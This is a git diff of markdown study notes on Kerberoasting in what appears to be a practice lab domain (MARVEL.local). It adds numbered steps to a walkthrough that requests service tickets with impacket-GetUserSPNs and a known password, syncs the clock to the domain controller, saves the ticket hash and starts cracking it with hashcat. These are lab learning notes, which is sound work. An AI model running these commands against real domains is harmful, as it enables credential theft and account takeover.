@@ -1,7 +1,8 @@
 # Kerberoasting
-servicePrincipalName attribute
+servicePrincipalName attribute<br>
+Requirements: Credentials, SPN
 ## Attack Overview
-Run impacket-GetUserSPNs using known credentials
+1. Run impacket-GetUserSPNs using known credentials
 ```
 ┌──(kali㉿kali)-[~]
 └─$ impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
@@ -20,7 +21,7 @@ HYDRA-DC/sqlservice.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owne
 └─$ 
 ```
 
-If you receive the 'KRB_AP_ERR_SKEW: Clock skew too great' error above, sync clock to target
+2. If you receive the 'KRB_AP_ERR_SKEW: Clock skew too great' error above, sync clock to target
 ```
 ┌──(kali㉿kali)-[~]
 └─$ date && sudo ntpdate 10.0.2.15 && date
@@ -32,7 +33,7 @@ Thu Dec 26 11:41:09 PM EST 2024
 └─$
 ```
 
-Successful run of impacket-GetUserSPNs
+3. Successful run of impacket-GetUserSPNs
 ```
 ┌──(kali㉿kali)-[~]
 └─$ impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
@@ -51,7 +52,7 @@ $krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$f76682df231820ae8c
 └─$ 
 ```
 
-Save the hash
+4. Save the hash
 ```
 ┌──(kali㉿kali)-[~]
 └─$ vi nthash.txt
@@ -60,7 +61,7 @@ $krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$f76682df231820ae8c
 └─$
 ```
 
-Crack the hash
+5. Crack the hash
 ```
 ┌──(kali㉿kali)-[~]
 └─$ hashcat -m 13100 nthash.txt /usr/share/wordlists/rockyou.txt 
